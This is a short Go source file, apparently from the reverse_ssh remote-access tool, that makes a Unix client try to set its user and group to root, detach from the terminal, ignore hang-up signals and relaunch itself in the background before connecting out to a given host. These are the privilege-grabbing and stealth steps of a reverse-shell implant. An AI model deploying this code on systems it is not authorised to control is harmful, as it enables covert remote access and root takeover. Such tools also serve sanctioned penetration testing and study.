//go:build !windows

package main

import (
	"log"
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
)

func Run(destination, fingerprint, proxyaddress string) {
	//Try to elavate to root (in case we are a root:root setuid/gid binary)
	syscall.Setuid(0)
	syscall.Setgid(0)

	//Create our own process group, and ignore any  hang up signals
	syscall.Setsid()
	signal.Ignore(syscall.SIGHUP)

	client.Run(destination, fingerprint, proxyaddress)
}

func Fork(destination, fingerprint, proxyaddress string) error {
	log.Println("Forking")

	err := fork("/proc/self/exe")
	if err != nil {
		log.Println("Forking from /proc/self/exe failed: ", err)

		binary, err := os.Executable()
		if err == nil {
			err = fork(binary)
		}

		log.Println("Forking from argv[0] failed: ", err)
		return err
	}
	return nil
}

func fork(path string) error {

	cmd := exec.Command(path, append([]string{"--foreground"}, os.Args[1:]...)...)
	err := cmd.Start()
	if err != nil {
		return err
	}

	if cmd.Process != nil {
		cmd.Process.Release()
	}
	return nil
}
